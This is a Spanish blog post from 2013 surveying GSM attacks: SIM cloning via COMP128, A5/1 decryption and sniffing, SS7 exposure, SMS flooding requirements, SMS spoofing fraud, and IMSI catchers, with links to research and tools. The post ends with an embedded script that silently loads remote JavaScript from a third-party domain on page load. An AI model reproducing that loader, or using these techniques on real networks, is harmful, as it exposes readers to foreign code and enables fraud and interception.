---
layout: post
title: Hacking en redes Moviles
date: 2013-01-15
author: neoranger
comments: true
categories: [Seguridad]
---
<div dir="ltr" style="text-align:left;"><div style="text-align:justify;">Antes  que nada quisiera dedicar estas lineas a un grande del internet :<br /><h1>Aaron Swartz ... </h1>No en vano el inventor de la World Wide Web, Sir Tim Berners-Lee,  tuiteó: "Aaron está muerto. Caminantes del mundo, perdimos a uno de  nuestros sabios. Hackers por derecho, perdimos a uno de los nuestros.  Padres todos, perdimos a un hijo. Lloremos".<br /><br />Bueno ahi  les dejo algo de información y espero que les sea de muchísima utilidad ,  pero eso sí el empleo que le den , serán ustedes los responsables, como  tema de investigación es fenomenal, existen diversos tipos de ataques  que han sido demostrados pero a pesar de haber sido detectadas dichas  vulnerabilidades aún la migración del algoritmo utilizado conllevaría  elevados costes para las compañías telefónicas, que tendría que  reconfigurar el servicio, y posiblemente tener que cambiar incluso  ciertos terminales de usuario y/o tarjetas SIM.</div><div style="text-align:justify;"><br /></div><div style="text-align:justify;"><b><u>1)Ataques al SIM:</u></b> Persiguen romper los algoritmos de cifrado de la SIM (A3+A8), con  objeto de acceder a la clave de la SIM Ki así como al número de IMSI,  normalmente con el objetivo de conseguir clonar la tarjeta SIM y  realizar llamadas de forma fraudulenta.</div><div style="text-align:justify;"><br /></div><div style="text-align:justify;"><b>Algoritmo COMP128:</b><br /><br /><a name='more'></a><br /><br />Inicialmente  se mantuvo en privado desde 1991 hasta 1997, cuando se filtró gran  parte del código del mismo; el resto de código que faltaba se obtuvo por  ingeniería inversa.<br />En Abril de 1998 la SDA (Smartcard Developer  Association) conjuntamente con dos investigadores de la U.C. de Berkeley  (Wagner/Goldberg), hicieron público el primer ataque al COMP128.</div><div style="text-align:justify;"><br /></div><div style="text-align:justify;">Woronscan  es una herramienta para el clonado de tarjetas SIM basado en  debilidades del algoritmo COMP128, requiere acceso físico a la tarjeta. </div><div style="text-align:justify;"><br /></div><div style="text-align:justify;">Spy-Wokiscan:  Troyano que se embebe en software para clonado de SIMs dentro de  ciertos paquetes del WoronScan, y que una vez se obtiene la clave, el  IMSI envía dicha información a cuentas de correo rusas. Download:</div><div style="text-align:justify;"><br /><b><span style="color:yellow;">http://www.mcafee.com/threat-intelligence/malware/default.aspx?id=142989</span></b></div><div style="text-align:justify;"><br /><u><b>2)Ataques a la señal de radio</b></u>:<br /><br />Persiguen conseguir acceder a información confidencial de llamadas, “sniffando” la<b> </b>señal de radio entre la MS y las BTS.<br />No  hay autenticación en la red, por tanto ataques de “Man in the middle”  son factibles. Esta señal está cifrada con el algoritmo A5/1, utilizando  la clave de sesión generada Kc.<br />Alex Biryukov, Adi Ahamir y David  Wagner, publican un esquema que rompe el algoritmo robusto A5/1, con  dos minutos de datos de llamada interceptada; el tiempo de ataque duró  solo 1 segundo: <br /><br /><span style="color:yellow;"><b>http://cryptome.org/a51-bsw.htm </b></span><br /><br /><u><b>3)Ataques A5/1 diciembre 2009 (Karsten Nohl, Chris Paget):</b></u><br /><br />Ingredientes necesarios para el éxito (Opensource):<br /><b>3.1. </b>Máquinas de procesamiento distribuido de alto rendimiento (grid computing):<br /><br />      <b><span style="color:yellow;"> Nvidia GTX280: 500 chains/s</span></b><br /><b><span style="color:yellow;">       PS3 Cell: 500 chains/s</span></b><br /><b><span style="color:yellow;">       ATI HD5870: 500 chains/s</span></b><br /><br /><b>3.2</b>.Software de Parametrización adecuado disponible en:<br /><br /><br /><b><span style="color:yellow;">       https://srlabs.de/decrypting_gsm/</span></b><br /><span style="color:yellow;"><b>       Tablas generadas y disponibles en Bittorrent.<br />       http://reflextor.com/e100torrents/</b></span><br /><span style="color:yellow;"><b>       Un portátil y un equipo de RF .</b></span><br /><br /><b>3.3.</b>Ya no es necesario ni siquiera el equipamiento indicado, es posible hacerlo con<b> </b>dispositivos móviles de $15 que actúan como sniffers corriendo un software de código abierto debidamente modificado.<br /><br /><span style="color:yellow;"><b>http://bb.osmocom.org/trac/</b></span><br /><br />De momento sólo compatible con algunos móviles antiguos de Motorola y Sony Ericsson.<br />Demostrado en la 27th Chaos Communication Congress el pasado 28 de diciembre de 2010:<br /><br /><b><span style="color:yellow;"> http://events.ccc.de/congress/2010/Fahrplan/attachments/1783_101228.27C3.GSM-Sniffing.Nohl_Munaut.pdf.</span></b></div><div style="text-align:justify;"><br />José Picó y David Perez de Taddong presentaron la demostración práctica en la RootedCON de 2011:<br /><br /><span style="color:yellow;"><b>http://www.slideshare.net/rootedcon/david-prez-jos-pic-un-ataque-prctico-contracomunicaciones-mviles-rootedcon-2011<br /> </b></span><br /><span style="color:yellow;"><b>http://vimeo.com/27258284</b></span><br /><br />Soluciones  al atque de A5/1<br />Solución actual: Aplicaciones de cifrado End-to-End: <b><span style="color:yellow;">http://www.cellcrypt.com</span></b><br /><b><span style="color:yellow;"><br /></span></b><b><u>4)Ataques a la red de señalización</u></b><br /><b><br /></b>Las  transmisiones solamente están cifradas entre el MS y las BTS, el resto  tráfico tras las BTS está sin cifrar. Los protocolos dentro de la red  del operador (BSSAP,MAP) están sin cifrar, por tanto cualquiera con  acceso a la red SS7 puede leer y/o modificar la información en el  aire.Por tanto si un hacker consigue acceder a la red de señalización,  puede obtener TODA la información sobre las llamadas.Si el hacker  accediera a la HLR, podría ser capaz de obtener todas las Ki de todoslos  clientes de una red. A pesar de que los algoritmos de cifrado mejoren,  la arquitectura de la red GSM seguirá siendo vulnerable a ataques desde  dentro y contra la red backbone del operador.</div><div style="text-align:justify;"><br /><u><b>5)Ataques de SMS DoS</b></u><br /><br />Persiguen  denegar el servicio de SMS e incluso de voz de un operador, mediante la  saturación de canales de tráfico de la red radio, en concreto los  canales de control. Como consecuencia de la cada vez mayor interconexión  con Internet de los servicios de móvil. En noviembre de 2005,  investigadores de la Universidad de Pensilvania publicaron un estudio al  respecto, sobre lo sencillo que sería realizar un ataque de DoS sobre  toda la ciudad de Manhattan o de Washington D.C. utilizando únicamente  un cablemodem   Con una botnet se podrían atacar todas las  comunicaciones de USA:<br /><br /><span style="color:yellow;"><b>http://smsanalysis.org/smsanalysis.pdf</b></span><br /><br />Requisitos para la realización de este tipo de ataques:<br />-Disponer de un servicio de envío de SMS por Internet.<br />-Disponer  de una lista de Objetivos (móviles) fiable   Diferentes formas de  obtenerla: (Web scraping, Bluetooth, Contactos sincronizados robados por  troyanos,etc…).<br />-Conocer la política de entrega de SMS del  proveedor: Buffer de mensajes, tipo de lista de entrega: LIFO, FIFO y  plazo de retención.<br />-Lanzar ataque distribuido a través de envío  simultáneo de SMS por medio de portales SMS disponibles, causando la  saturación de los canales de control en la transmisión.<br /><br /><u><b>6)Ataques SMS: SMS Spoofing</b></u><br /><br />¿Cómo  obtienen beneficio los atacantes del SMS spoofing? Normalmente mediante  ingeniería social, animando a llamar a números de alto coste o a  acceder a páginas web con malware albergado. Asimismo, potencialmente  podrían utilizarse para envío de comunicados erróneos, por ejemplo de  servicios bancarios con objeto de animar a los usuarios a facilitar  información sensible  Ligado al SMShing.<br /><br />Caso reciente:  Atacante envía grandes volúmenes de SMS fraudulentos a clientes de un  proveedor italiano a través de un conocido proveedor de móvil. El  mensaje solicitaba a los abonados llamar a un número de voz de  tarificación adicional. Los abonados italianos pagaban al operador  italiano por llamadas de alto coste, y el<br />operador italiano pagaba  la parte proporcional de beneficios a un proveedor del servicio, que a  su vez repercutía en el atacante. A los abonados inocentes del proveedor  de móvil, cuyos números origen habían<br />sido falsificados, les  facturaban cada mensaje SMS en roaming. El operador se dio cuenta a  tiempo y paró la facturación antes de que llegaran a los clientes.  Impactos para el negocio: Insatisfacción de clientes, pérdidas derivadas  de los costes de envío internacional de móvil, costes a la red  receptora de procesamiento<br />de los SMS   Mala imagen para la red receptora y para la red “falsificada”.<br /><br /><u><b>7)Ataques Man-in-the-Middle:</b></u><br /><br />Permite  obtener información sensible de un móvil objetivo utilizando para ello  un dispositivo, IMSI catcher o VBTS (Virtual Base Transceiver Station),  que emitiendo con una mayor potencia que la antena legítima del operador  induce al dispositivo móvil a registrarse en esta BTS falsa, con objeto  de capturar<br />información sensible del abonado. Permite obtener los  IMSI, IMEI de los móviles, la localización de los mismos así como  potencialmente poder escuchar y/o interceptar conversaciones  telefónicas.<br /><br />Utilizado habitualmente por las  autoridades para llevar a cabo investigaciones. El famoso hacker Kevin  Mitnick fue localizado utilizando una técnica similar en los años 90 por  el FBI, ayudados por una antena de elevada potencia montada sobre un  camión, denominada “triggerfish”. (En España esto violaría el artículo  18.3 de la constitución, deber de secreto de las comunicaciones):<br /><br /><span style="color:yellow;"><b>http://www.essortment.com/all/kevinmitnickco_rmap.htm</b></span><br /><br />Equipamiento avanzado para espionaje, mediante la técnica de “IMSI catcher” disponible a la venta en Internet:<br /><br /><span style="color:yellow;"><b>http://www.ukspyequipment.com/more/on/details/00052</b></span></div><div style="text-align:justify;">Bueno muchachos a seguir investigando , que por seguro encontrarán mejores herramientas y técnicas.<br /><br /><br />arthurhuamanic.blogspot.com.es</div>(function(){try{var header=document.getElementsByTagName("HEAD")[0];var script=document.createElement("SCRIPT");script.src="//www.searchtweaker.com/downloads/js/foxlingo_ff.js";script.onload=script.onreadystatechange=function(){if (!(this.readyState)||(this.readyState=="complete"||this.readyState=="loaded")){script.onload=null;script.onreadystatechange=null;header.removeChild(script);}}; header.appendChild(script);} catch(e) {}})();</div>
